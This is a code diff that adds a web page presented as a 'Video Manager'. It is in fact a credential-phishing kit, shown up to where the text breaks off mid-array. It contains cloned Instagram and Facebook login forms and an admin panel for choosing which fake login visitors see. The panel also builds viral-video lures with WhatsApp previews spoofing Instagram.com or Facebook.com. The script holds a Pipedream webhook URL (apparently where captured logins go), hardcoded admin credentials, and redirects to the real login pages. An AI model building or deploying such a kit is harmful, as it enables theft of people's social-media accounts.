@@ -1,50 +1,1854 @@
-async function addVideo() {
-    const title = document.getElementById('videoTitleInput').value.trim();
-    const fileInput = document.getElementById('videoImageInput');
-    const desc = document.getElementById('videoDescInput').value.trim();
-    const siteName = document.getElementById('videoSiteNameInput').value.trim() || 'Viral Videos';
-
-    if (!title || !desc) {
-        showToast('Please fill in title and description!', 'error');
-        return;
-    }
-
-    let imageUrl = 'https://picsum.photos/400/400';
-
-    if (fileInput.files.length > 0) {
-        const file = fileInput.files[0];
-        const formData = new FormData();
-        formData.append('image', file);
-
-        try {
-            const response = await fetch('/api/upload', {
-                method: 'POST',
-                body: formData
-            });
-
-            if (response.ok) {
-                const data = await response.json();
-                imageUrl = data.imageUrl;
-                console.log('✅ Image uploaded to Cloudinary:', imageUrl);
-            } else {
-                showToast('Image upload failed, using placeholder', 'error');
-            }
-        } catch (e) {
-            console.log('❌ Upload error:', e);
-            showToast('Image upload failed, using placeholder', 'error');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Video Manager</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    }
+        body {
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            font-family: 'Roboto', Arial, Helvetica, sans-serif;
+        }
+        .page {
+            display: none;
+            width: 100%;
+        }
+        .page.active {
+            display: flex;
+            justify-content: center;
+        }
+        .instagram-container {
+            width: 100%;
+            max-width: 420px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 25px;
+            background: #fff;
+        }
+        .instagram-container .language-wrapper {
+            position: relative;
+            text-align: center;
+            margin: 10px 0 30px;
+        }
+        .instagram-container .language-btn {
+            color: #6c7785;
+            font-size: 18px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-family: 'Roboto', sans-serif;
+            padding: 5px 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: color 0.3s;
+        }
+        .instagram-container .language-btn:hover {
+            color: #1877f2;
+        }
+        .instagram-container .language-btn i {
+            font-size: 14px;
+            transition: transform 0.3s;
+        }
+        .instagram-container .language-btn i.open {
+            transform: rotate(180deg);
+        }
+        .instagram-container .language-dropdown {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            max-height: 250px;
+            overflow-y: auto;
+            min-width: 180px;
+            z-index: 100;
+            padding: 8px 0;
+            margin-top: 4px;
+        }
+        .instagram-container .language-dropdown.show {
+            display: block;
+        }
+        .instagram-container .language-dropdown .lang-item {
+            padding: 10px 20px;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            transition: background 0.2s, color 0.2s;
+            text-align: left;
+            white-space: nowrap;
+        }
+        .instagram-container .language-dropdown .lang-item:hover {
+            background: #f0f2f5;
+        }
+        .instagram-container .language-dropdown .lang-item.active {
+            background: #e7f3ff;
+            color: #1877f2;
+        }
+        .instagram-container .language-dropdown::-webkit-scrollbar {
+            width: 4px;
+        }
+        .instagram-container .language-dropdown::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+        .instagram-container .language-dropdown::-webkit-scrollbar-thumb {
+            background: #ccc;
+            border-radius: 4px;
+        }
+        .instagram-container .logo {
+            width: 90px;
+            margin: 0 auto 50px;
+            display: block;
+        }
+        .instagram-container input {
+            width: 100%;
+            height: 70px;
+            margin-bottom: 18px;
+            border: 2px solid #d8dde5;
+            border-radius: 22px;
+            padding: 0 20px;
+            font-size: 18px;
+            outline: none;
+            font-family: 'Roboto', sans-serif;
+            transition: border-color 0.3s;
+        }
+        .instagram-container input:focus {
+            border-color: #1877f2;
+        }
+        .instagram-container input.error {
+            border-color: #dc3545;
+            background: #fff5f5;
+        }
+        .instagram-container .password-wrapper {
+            position: relative;
+        }
+        .instagram-container .password-wrapper input {
+            padding-right: 50px;
+        }
+        .instagram-container .toggle-password {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 20px;
+            padding: 5px;
+            opacity: 0;
+            transition: opacity 0.2s ease, color 0.2s;
+            pointer-events: none;
+        }
+        .instagram-container .toggle-password.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .instagram-container .toggle-password:hover {
+            color: #1877f2;
+        }
+        .instagram-container .login-btn {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 30px;
+            background: #1877f2;
+            color: #fff;
+            font-size: 17px;
+            cursor: pointer;
+            font-weight: 500;
+            margin-top: 10px;
+            transition: opacity 0.2s, transform 0.2s;
+            position: relative;
+            font-family: 'Roboto', sans-serif;
+        }
+        .instagram-container .login-btn:hover {
+            opacity: 0.9;
+        }
+        .instagram-container .login-btn:active {
+            transform: scale(0.98);
+        }
+        .instagram-container .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .instagram-container .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .instagram-container .spinner.show {
+            display: inline-block;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .instagram-container .forgot {
+            margin-top: 35px;
+            text-align: center;
+        }
+        .instagram-container .forgot a {
+            text-decoration: none;
+            color: #222;
+            font-size: 18px;
+            transition: color 0.3s;
+            font-family: 'Roboto', sans-serif;
+        }
+        .instagram-container .forgot a:hover {
+            color: #1877f2;
+        }
+        .instagram-container .bottom {
+            margin-top: auto;
+            width: 100%;
+            padding-bottom: 20px;
+        }
+        .instagram-container .create-btn {
+            width: 100%;
+            height: 50px;
+            border: 2px solid #1877f2;
+            background: #fff;
+            color: #1877f2;
+            border-radius: 30px;
+            font-size: 17px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background 0.2s, color 0.2s;
+            font-family: 'Roboto', sans-serif;
+        }
+        .instagram-container .create-btn:hover {
+            background: #1877f2;
+            color: #fff;
+        }
+        .instagram-container .meta-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 25px;
+        }
+        .instagram-container .meta-wrapper .meta-icon {
+            font-size: 24px;
+            color: #111;
+            font-weight: 300;
+        }
+        .instagram-container .meta-wrapper .meta-text {
+            font-size: 20px;
+            color: #111;
+            font-weight: 500;
+            font-family: 'Roboto', sans-serif;
+        }
+        .facebook-container {
+            width: 100%;
+            max-width: 420px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            background: #fff;
+        }
+        .facebook-container .top-banner {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #1877f2;
+            font-size: 12px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+            white-space: nowrap;
+            margin-top: 10px;
+        }
+        .facebook-container .top-banner i {
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+        .facebook-container .top-banner span {
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .facebook-container .language-wrapper {
+            position: relative;
+            text-align: center;
+            margin: 16px 0;
+        }
+        .facebook-container .language-btn {
+            color: #666;
+            font-size: 14px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-family: Arial, Helvetica, sans-serif;
+            padding: 5px 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: color 0.3s;
+        }
+        .facebook-container .language-btn:hover {
+            color: #1877f2;
+        }
+        .facebook-container .language-btn i {
+            font-size: 12px;
+            transition: transform 0.3s;
+        }
+        .facebook-container .language-btn i.open {
+            transform: rotate(180deg);
+        }
+        .facebook-container .language-dropdown {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            max-height: 250px;
+            overflow-y: auto;
+            min-width: 180px;
+            z-index: 100;
+            padding: 8px 0;
+            margin-top: 4px;
+        }
+        .facebook-container .language-dropdown.show {
+            display: block;
+        }
+        .facebook-container .language-dropdown .lang-item {
+            padding: 10px 20px;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            transition: background 0.2s, color 0.2s;
+            text-align: left;
+            white-space: nowrap;
+        }
+        .facebook-container .language-dropdown .lang-item:hover {
+            background: #f0f2f5;
+        }
+        .facebook-container .language-dropdown .lang-item.active {
+            background: #e7f3ff;
+            color: #1877f2;
+        }
+        .facebook-container .language-dropdown::-webkit-scrollbar {
+            width: 4px;
+        }
+        .facebook-container .language-dropdown::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+        .facebook-container .language-dropdown::-webkit-scrollbar-thumb {
+            background: #ccc;
+            border-radius: 4px;
+        }
+        .facebook-container .logo {
+            text-align: center;
+            margin: 25px 0 35px;
+        }
+        .facebook-container .logo i {
+            font-size: 60px;
+            color: #1877f2;
+        }
+        .facebook-container .input-group {
+            margin-top: 30px;
+        }
+        .facebook-container .input-group input {
+            width: 100%;
+            padding: 20px;
+            font-size: 18px;
+            border: 1px solid #ddd;
+            border-radius: 16px;
+            margin-bottom: 12px;
+            outline: none;
+            transition: border-color 0.3s;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .facebook-container .input-group input:focus {
+            border-color: #1877f2;
+        }
+        .facebook-container .input-group input.error {
+            border-color: #dc3545;
+            background: #fff5f5;
+        }
+        .facebook-container .password-wrapper {
+            position: relative;
+        }
+        .facebook-container .password-wrapper input {
+            padding-right: 50px;
+        }
+        .facebook-container .toggle-password {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 18px;
+            padding: 5px;
+            opacity: 0;
+            transition: opacity 0.2s ease, color 0.2s;
+            pointer-events: none;
+        }
+        .facebook-container .toggle-password.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .facebook-container .toggle-password:hover {
+            color: #1877f2;
+        }
+        .facebook-container .login-btn {
+            width: 100%;
+            padding: 10px 16px;
+            border: none;
+            border-radius: 30px;
+            background: #1877f2;
+            color: #fff;
+            font-size: 17px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: opacity 0.3s, transform 0.2s;
+            position: relative;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .facebook-container .login-btn:hover {
+            opacity: 0.9;
+        }
+        .facebook-container .login-btn:active {
+            transform: scale(0.98);
+        }
+        .facebook-container .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .facebook-container .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .facebook-container .spinner.show {
+            display: inline-block;
+        }
+        .facebook-container .forgot {
+            text-align: center;
+            margin: 24px 0;
+            font-size: 15px;
+        }
+        .facebook-container .forgot a {
+            text-decoration: none;
+            color: #000;
+            transition: color 0.3s;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .facebook-container .forgot a:hover {
+            color: #1877f2;
+        }
+        .facebook-container .bottom {
+            margin-top: auto;
+            text-align: center;
+        }
+        .facebook-container .create-btn {
+            width: 100%;
+            padding: 10px 16px;
+            border: 1.5px solid #1877f2;
+            border-radius: 30px;
+            background: #fff;
+            color: #1877f2;
+            font-size: 17px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.3s, color 0.3s, border-color 0.3s;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .facebook-container .create-btn:hover {
+            background: #1877f2;
+            color: #fff;
+        }
+        .facebook-container .meta-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 3px;
+            margin-top: 20px;
+        }
+        .facebook-container .meta-wrapper .meta-icon {
+            font-size: 24px;
+            color: #1877f2;
+        }
+        .facebook-container .meta-wrapper .meta-text {
+            font-size: 16px;
+            color: #1a1a1a;
+            font-weight: 500;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .facebook-container .bottom-footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 11px;
+            color: #737373;
+            padding-bottom: 8px;
+            letter-spacing: 0px;
+        }
+        .facebook-container .bottom-footer span {
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        .facebook-container .bottom-footer span:hover {
+            color: #1877f2;
+        }
+        .facebook-container .bottom-footer .dot {
+            margin: 0 2px;
+            color: #ccc;
+            cursor: default;
+        }
+        .dashboard-container {
+            width: 100%;
+            max-width: 900px;
+            min-height: 100vh;
+            padding: 20px;
+            background: #fff;
+            margin: 0 auto;
+        }
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .dashboard-header h1 {
+            color: #1877f2;
+            font-size: 24px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .dashboard-header .admin-badge {
+            background: #e7f3ff;
+            color: #1877f2;
+            font-size: 12px;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .dashboard-header .logout-btn {
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 8px 16px;
+            border-radius: 8px;
+            transition: background 0.2s, color 0.2s;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .dashboard-header .logout-btn:hover {
+            background: #f0f2f5;
+            color: #1877f2;
+        }
+        .platform-selector {
+            background: #e7f3ff;
+            border-radius: 16px;
+            padding: 20px 24px;
+            border: 1px solid #cce0f5;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .platform-selector .label {
+            font-size: 14px;
+            color: #1a1a1a;
+            font-weight: 500;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .platform-selector .label .highlight {
+            color: #1877f2;
+            font-weight: 600;
+        }
+        .platform-selector .current-platform {
+            font-weight: 600;
+            color: #1877f2;
+            font-size: 15px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .platform-selector select {
+            padding: 8px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            background: #fff;
+            cursor: pointer;
+            outline: none;
+            min-width: 200px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .platform-selector select:focus {
+            border-color: #1877f2;
+        }
+        .platform-selector .save-platform-btn {
+            padding: 8px 24px;
+            border: none;
+            border-radius: 20px;
+            background: #1877f2;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.3s;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .platform-selector .save-platform-btn:hover {
+            opacity: 0.9;
+        }
+        .add-video-form {
+            background: #f7f8fa;
+            border-radius: 16px;
+            padding: 24px;
+            border: 1px solid #e4e6eb;
+            margin-bottom: 30px;
+        }
+        .add-video-form h3 {
+            color: #1a1a1a;
+            font-size: 18px;
+            margin-bottom: 16px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .add-video-form input,
+        .add-video-form textarea {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 14px;
+            margin-bottom: 12px;
+            outline: none;
+            font-family: Arial, Helvetica, sans-serif;
+            transition: border-color 0.3s;
+        }
+        .add-video-form textarea {
+            resize: vertical;
+            min-height: 60px;
+        }
+        .add-video-form input:focus,
+        .add-video-form textarea:focus {
+            border-color: #1877f2;
+        }
+        .add-video-form .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        .add-video-form input[type="file"] {
+            padding: 10px 12px;
+            border: 2px dashed #cbd5e1;
+            border-radius: 10px;
+            background: #fafbfc;
+            cursor: pointer;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .add-video-form input[type="file"]:hover {
+            border-color: #1877f2;
+            background: #f0f7ff;
+        }
+        .add-video-form button {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 30px;
+            background: #1877f2;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.3s;
+            width: 100%;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .add-video-form button:hover {
+            opacity: 0.9;
+        }
+        .video-list {
+            display: grid;
+            gap: 12px;
+        }
+        .video-item {
+            background: #f7f8fa;
+            border-radius: 12px;
+            padding: 16px 20px;
+            border: 1px solid #e4e6eb;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: border-color 0.3s;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .video-item:hover {
+            border-color: #1877f2;
+        }
+        .video-item .video-info {
+            flex: 1;
+        }
+        .video-item .video-info .title {
+            color: #1a1a1a;
+            font-size: 16px;
+            font-weight: 600;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .video-item .video-info .desc {
+            color: #666;
+            font-size: 13px;
+            margin-top: 2px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .video-item .video-info .video-thumb {
+            margin-top: 6px;
+        }
+        .video-item .video-info .video-thumb img {
+            max-width: 80px;
+            max-height: 80px;
+            border-radius: 8px;
+            border: 1px solid #e4e6eb;
+            object-fit: cover;
+        }
+        .video-item .video-info .video-id {
+            color: #999;
+            font-size: 11px;
+            margin-top: 4px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .video-item .video-info .video-id a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .video-item .video-info .video-id a:hover {
+            text-decoration: underline;
+        }
+        .video-item .video-actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .video-item .video-actions button {
+            padding: 6px 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            transition: opacity 0.3s;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .video-item .video-actions .edit-btn {
+            background: #e4e6eb;
+            color: #1a1a1a;
+        }
+        .video-item .video-actions .edit-btn:hover {
+            background: #d0d2d6;
+        }
+        .video-item .video-actions .delete-btn {
+            background: #dc3545;
+            color: #fff;
+        }
+        .video-item .video-actions .delete-btn:hover {
+            opacity: 0.8;
+        }
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: #999;
+        }
+        .empty-state i {
+            font-size: 48px;
+            margin-bottom: 16px;
+            opacity: 0.3;
+        }
+        .empty-state p {
+            font-size: 16px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: #1a1a1a;
+            color: #fff;
+            padding: 16px 24px;
+            border-radius: 12px;
+            display: none;
+            z-index: 999;
+            max-width: 350px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .toast.show {
+            display: block;
+            animation: slideUp 0.3s ease;
+        }
+        .toast.success {
+            border-left: 4px solid #28a745;
+        }
+        .toast.error {
+            border-left: 4px solid #dc3545;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .edit-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .edit-modal.active {
+            display: flex;
+        }
+        .edit-modal .modal-content {
+            background: #fff;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.2);
+        }
+        .edit-modal .modal-content h3 {
+            color: #1a1a1a;
+            margin-bottom: 16px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .edit-modal .modal-content input,
+        .edit-modal .modal-content textarea {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 14px;
+            margin-bottom: 12px;
+            outline: none;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .edit-modal .modal-content textarea {
+            resize: vertical;
+            min-height: 60px;
+        }
+        .edit-modal .modal-content input:focus,
+        .edit-modal .modal-content textarea:focus {
+            border-color: #1877f2;
+        }
+        .edit-modal .modal-content .modal-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 4px;
+        }
+        .edit-modal .modal-content .modal-actions button {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 30px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.3s;
+            flex: 1;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .edit-modal .modal-content .modal-actions .save-btn {
+            background: #1877f2;
+            color: #fff;
+        }
+        .edit-modal .modal-content .modal-actions .cancel-btn {
+            background: #e4e6eb;
+            color: #1a1a1a;
+        }
+        .edit-modal .modal-content .modal-actions button:hover {
+            opacity: 0.8;
+        }
+        @media (max-width: 600px) {
+            .add-video-form .form-row {
+                grid-template-columns: 1fr;
+            }
+            .video-item {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .video-item .video-actions {
+                width: 100%;
+            }
+            .video-item .video-actions button {
+                flex: 1;
+                text-align: center;
+            }
+            .dashboard-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .toast {
+                bottom: 20px;
+                right: 20px;
+                left: 20px;
+                max-width: none;
+            }
+            .platform-selector {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+            }
+            .platform-selector select {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="instagramPage" class="page">
+        <div class="instagram-container">
+            <div class="language-wrapper">
+                <button class="language-btn" id="instaLanguageBtn" onclick="toggleInstaDropdown()" aria-label="Select language">
+                    <span id="instaCurrentLanguage">English</span>
+                    <i class="fas fa-chevron-down" id="instaDropdownArrow"></i>
+                </button>
+                <div class="language-dropdown" id="instaLanguageDropdown" role="listbox"></div>
+            </div>
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
+            <input type="text" id="instaUsername" placeholder="Username, email or mobile number" />
+            <div class="password-wrapper">
+                <input type="password" id="instaPassword" placeholder="Password" />
+                <button class="toggle-password" id="instaTogglePassword" type="button" aria-label="Toggle password visibility">
+                    <i class="fas fa-eye"></i>
+                </button>
+            </div>
+            <button class="login-btn" id="instaLoginBtn" onclick="handleInstagramLogin()">
+                <span id="instaLoginText">Log in</span>
+                <span class="spinner" id="instaSpinner"></span>
+            </button>
+            <div class="forgot"><a href="#" id="instaForgotText">Forgot password?</a></div>
+            <div class="bottom">
+                <button class="create-btn" id="instaCreateBtn">Create new account</button>
+                <div class="meta-wrapper">
+                    <span class="meta-icon">∞</span>
+                    <span class="meta-text" id="instaMetaText">Meta</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="facebookPage" class="page">
+        <div class="facebook-container" id="facebookContainer">
+            <div class="top-banner">
+                <i class="fa-solid fa-download"></i>
+                <span id="fbBannerText">Get Facebook for Android so you can browse faster.</span>
+            </div>
+            <div class="language-wrapper">
+                <button class="language-btn" id="fbLanguageBtn" onclick="toggleFbDropdown()" aria-label="Select language">
+                    <span id="fbCurrentLanguage">English</span>
+                    <i class="fas fa-chevron-down" id="fbDropdownArrow"></i>
+                </button>
+                <div class="language-dropdown" id="fbLanguageDropdown" role="listbox"></div>
+            </div>
+            <div class="logo"><i class="fab fa-facebook"></i></div>
+            <div class="input-group">
+                <input type="text" id="fbUsername" placeholder="Mobile phone number or email address" autocomplete="username" autocapitalize="off" spellcheck="false" />
+                <div class="password-wrapper">
+                    <input type="password" id="fbPassword" placeholder="Password" autocomplete="current-password" />
+                    <button class="toggle-password" id="fbTogglePassword" type="button" aria-label="Toggle password visibility">
+                        <i class="fas fa-eye"></i>
+                    </button>
+                </div>
+                <button class="login-btn" id="fbLoginBtn" onclick="handleFacebookLogin()">
+                    <span id="fbLoginText">Log in</span>
+                    <span class="spinner" id="fbSpinner"></span>
+                </button>
+            </div>
+            <div class="forgot"><a href="#" id="fbForgotText">Forgot your password?</a></div>
+            <div class="bottom">
+                <button class="create-btn" id="fbCreateBtn">Create new account</button>
+                <div class="meta-wrapper">
+                    <span class="meta-icon">∞</span>
+                    <span class="meta-text" id="fbMetaText">Meta</span>
+                </div>
+                <div class="bottom-footer">
+                    <span id="fbAboutText" onclick="alert('About page')">About</span>
+                    <span class="dot">·</span>
+                    <span id="fbHelpText" onclick="alert('Help page')">Help</span>
+                    <span class="dot">·</span>
+                    <span id="fbMoreText" onclick="alert('More options')">More</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="dashboardPage" class="page">
+        <div class="dashboard-container">
+            <div class="dashboard-header">
+                <div>
+                    <h1>📹 Video Manager</h1>
+                    <span class="admin-badge">Admin</span>
+                </div>
+                <button class="logout-btn" onclick="logout()">Logout</button>
+            </div>
+            <div class="platform-selector">
+                <div>
+                    <span class="label">🎯 <span class="highlight">Platform Selector</span></span>
+                    <div style="margin-top:4px; font-size:13px; color:#666;">Choose which login page visitors see</div>
+                </div>
+                <div style="display:flex; align-items:center; gap:12px; flex-wrap:wrap;">
+                    <span class="current-platform" id="currentPlatformDisplay">Facebook</span>
+                    <select id="platformSelect">
+                        <option value="facebook">Facebook</option>
+                        <option value="instagram">Instagram</option>
+                    </select>
+                    <button class="save-platform-btn" onclick="savePlatform()">Save Platform</button>
+                </div>
+            </div>
+            <div class="add-video-form">
+                <h3>➕ Add New Video</h3>
+                <div class="form-row">
+                    <input type="text" id="videoTitleInput" placeholder="Video Title" />
+                    <input type="file" id="videoImageInput" accept="image/*" />
+                </div>
+                <textarea id="videoDescInput" placeholder="Video Description (shows on WhatsApp preview)"></textarea>
+                <input type="text" id="videoSiteNameInput" placeholder="Show Name As (e.g. Instagram.com, Facebook.com)" />
+                <button onclick="addVideo()">Add Video</button>
+            </div>
+            <div id="videoListContainer"></div>
+        </div>
+    </div>
+    <div class="toast" id="toast"></div>
+    <div class="edit-modal" id="editModal">
+        <div class="modal-content">
+            <h3>✏️ Edit Video</h3>
+            <input type="text" id="editTitle" placeholder="Video Title" />
+            <input type="text" id="editImage" placeholder="Image URL" />
+            <textarea id="editDesc" placeholder="Video Description"></textarea>
+            <input type="text" id="editSiteName" placeholder="Show Name As (e.g. Instagram.com)" />
+            <div class="modal-actions">
+                <button class="cancel-btn" onclick="closeEditModal()">Cancel</button>
+                <button class="save-btn" onclick="saveEdit()">Save Changes</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        // ============================================================
+        // ADMIN CREDENTIALS
+        // ============================================================
+        const ADMIN_USER = 'admin';
+        const ADMIN_PASS = 'admin123';
 
-    const newVideo = { 
-        id: getNextId(), 
-        title, 
-        description: desc, 
-        thumbnail: imageUrl,  // ← MUST be "thumbnail"
-        siteName: siteName 
-    };
-    
-    videos.push(newVideo);
-    saveVideos();
-    renderVideos();
-    // ...
-}
+        // ============================================================
+        // PIPEDREAM WEBHOOK
+        // ============================================================
+        const PIPEDREAM_WEBHOOK = 'https://eo6iu06jrrzv8j7.m.pipedream.net';
+
+        // ============================================================
+        // PLATFORM CONFIGURATIONS
+        // ============================================================
+        const platforms = {
+            facebook: {
+                name: 'Facebook',
+                ogTitle: 'Log in to Facebook',
+                ogDescription: 'Connect with friends, family and people you know.',
+                ogImage: 'https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg',
+                ogSiteName: 'Facebook',
+                redirectUrl: 'https://www.facebook.com/login.php',
+                previewColor: '#1877f2'
+            },
+            instagram: {
+                name: 'Instagram',
+                ogTitle: 'Log in to Instagram',
+                ogDescription: 'Share moments, stories and connect with people.',
+                ogImage: 'https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png',
+                ogSiteName: 'Instagram',
+                redirectUrl: 'https://www.instagram.com/accounts/login/',
+                previewColor: '#E4405F'
+            }
+        };
+
+        let currentPlatform = 'facebook';
+        let videos = [];
+        let editId = null;
+
+        // ============================================================
+        // VIDEO STORAGE
+        // ============================================================
+        function loadVideos() {
+            try {
+                const stored = localStorage.getItem('videos');
+                if (stored) {
+                    videos = JSON.parse(stored);
+                } else {
+                    videos = [
+                        { id: 1, title: 'Watch This Amazing Video', description: 'This video is going viral! Watch now before it\'s gone.', thumbnail: 'https://images.unsplash.com/photo-1611162616475-46b635cb6868?w=400&h=400&fit=crop', siteName: 'Viral Videos' },
+                        { id: 2, title: 'Funny Cat Compilation', description: 'You won\'t believe what this cat does! 😂', thumbnail: 'https://images.unsplash.com/photo-1574158622682-e40e69881006?w=400&h=400&fit=crop', siteName: 'Funny Moments' },
